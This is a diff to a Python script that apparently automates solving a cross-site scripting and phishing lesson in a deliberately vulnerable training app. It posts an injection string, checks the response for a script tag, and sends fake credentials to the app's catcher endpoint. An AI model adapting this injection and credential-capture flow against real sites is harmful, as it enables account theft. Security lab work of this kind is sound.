@@ -40,19 +40,29 @@ with requests.Session() as s:
     r = s.get(url +'/service/source.mvc') 
     r = s.get(url +'/service/lessonplan.mvc')
     r = s.get(url +'/service/solution.mvc')
-    r = s.post(url + attack_url, attack_string )
-    print(r.content)
+
+    injection_response = s.post(url + attack_url, attack_string )
+
     r = s.get(url + '/service/cookie.mvc')
     r = s.get(url + '/service/lessonmenu.mvc')
 
-# Figure out which menu item is "Http Basics"
+    if "<script>" in str(injection_response.content):
+        print("injection successfull")
+    
+    r = s.get(url +'/catcher?PROPERTY=yes&user=foo&password=bar')
 
-# Request the lesson for General => Http Basics
+    # print(r.content)
 
-# Submit the attack to the General => Http Basics page
 
-# Purposefully fail for testing purposes
+    r = s.get(url + '/start.mvc?user=foo&pass=bar&login=login')
 
-#if successfull, say so otherwise don't #logic
-print("Attack Successfull")
+    r = s.get(url+ attack_url)
+
+    if "Congratulations" in str(r.content):
+        print("Phishing successfull")
+        print("Attack Successfull")
+
+
+
+
 
